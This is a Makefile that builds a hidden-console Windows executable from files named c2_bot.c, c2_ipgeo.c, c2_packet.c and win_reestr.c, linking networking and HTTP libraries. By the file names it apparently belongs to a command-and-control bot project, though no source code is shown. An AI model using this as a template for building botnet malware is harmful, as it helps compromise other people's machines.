OUT_DIR = source

SRC_MAIN = x86_x64.c
SRC_BOT = c2_bot.c
SRC_IPGEO = c2_ipgeo.c
SRC_PACKET = c2_packet.c
SRC_WIN_REESTR = win_reestr.c
SRC_WIN_APP = windows.c

MAIN_OUT = $(OUT_DIR)/x86_x64.exe

CC = gcc
CFLAGS = -mwindows
LDFLAGS = -lws2_32
HTTPFLAGS = -lwinhttp
LAPIFLAGS = -liphlpapi

exe: $(MAIN_OUT)

$(MAIN_OUT): $(SRC_MAIN)
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) $(SRC_MAIN) -o $(MAIN_OUT) $(SRC_BOT) $(SRC_IPGEO) $(SRC_PACKET) $(SRC_WIN_REESTR) $(CFLAGS) $(LDFLAGS) $(HTTPFLAGS) $(LAPIFLAGS)
	$(CC) -std=c17 $(SRC_WIN_APP) -IC:\SDL3\x86_64-w64-mingw32\include -LC:\SDL3\x86_64-w64-mingw32\lib -o $(OUT_DIR)/windows_x86_x64.exe -Wall -lmingw32 -lSDL3 $(CFLAGS)

clean:
	rm -f $(EXE_OUT) $(DLL_OUT)
